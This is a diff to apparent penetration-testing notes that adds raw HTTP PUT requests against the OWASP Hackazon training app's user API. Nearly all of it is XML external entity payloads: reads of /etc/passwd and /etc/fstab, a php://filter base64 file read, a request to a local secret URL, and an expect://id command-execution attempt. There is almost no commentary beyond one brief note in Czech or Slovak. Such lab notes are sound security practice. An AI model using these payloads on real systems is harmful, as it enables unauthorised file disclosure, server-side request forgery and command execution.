@@ -48,10 +48,107 @@ Host: hackazon.owasp.local
 Authorization: Token 1af538baa9045a84c0e889f672baf83ff24
 Accept: application/json, text/javascript, */*; q=0.01
 Content-Type: application/xml; charset=UTF-8
+Content-Length: 88
+Connection: close
+
+<?xml version='1.0' encoding ='utf-8'?>
+<!DOCTYPE a [<!ENTITY e 'XEXE'>]>
+<a>&e;</a>
+```
+
+```
+PUT /api/user/3 HTTP/1.1
+Host: hackazon.owasp.local
+Authorization: Token 1af538baa9045a84c0e889f672baf83ff24
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/xml; charset=UTF-8
 Content-Length: 139
 Connection: close
 
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE roottag [<!ENTITY goodies SYSTEM "file:///etc/passwd">]>
 <roottag>&goodies;</roottag>
+```
+
+
+```
+PUT /api/user/3 HTTP/1.1
+Host: hackazon.owasp.local
+Authorization: Token 1af538baa9045a84c0e889f672baf83ff24
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/xml; charset=UTF-8
+Content-Length: 130
+Connection: close
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE roottag [<!ENTITY goodies SYSTEM "/etc/passwd">]>
+<roottag>&goodies;</roottag>
+
+```
+
+
+```
+PUT /api/user/3 HTTP/1.1
+Host: hackazon.owasp.local
+Authorization: Token 1af538baa9045a84c0e889f672baf83ff24
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/xml; charset=UTF-8
+Content-Length: 119
+Connection: close
+
+<?xml version='1.0' encoding='utf-8'?>
+<!DOCTYPE a [<!ENTITY cmd SYSTEM 'http://127.0.0.1/secret.txt'>]>
+<a>&cmd;</a>
+```
+
+```
+PUT /api/user/3 HTTP/1.1
+Host: hackazon.owasp.local
+Authorization: Token 1af538baa9045a84c0e889f672baf83ff24
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/xml; charset=UTF-8
+Content-Length: 103
+Connection: close
+
+<?xml version='1.0' encoding='utf-8'?>
+<!DOCTYPE a [<!ENTITY cmd SYSTEM 'expect://id'>]>
+<a>&cmd;</a>
+```
+
+Problemy s /etc/fstab
+
+
+```
+PUT /api/user/3 HTTP/1.1
+Host: hackazon.owasp.local
+Authorization: Token 1af538baa9045a84c0e889f672baf83ff24
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/xml; charset=UTF-8
+Content-Length: 130
+Connection: close
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE roottag [<!ENTITY goodies SYSTEM "/etc/fstab">]>
+<roottag>&goodies;</roottag>
+
+```
+
+
+```
+PUT /api/user/3 HTTP/1.1
+Host: hackazon.owasp.local
+Authorization: Token 1af538baa9045a84c0e889f672baf83ff24
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/xml; charset=UTF-8
+Content-Length: 154
+Connection: close
+
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY bar SYSTEM
+  "php://filter/read=convert.base64-encode/resource=/etc/fstab">
+]>
+<foo>
+  &bar;
+</foo>
 ```
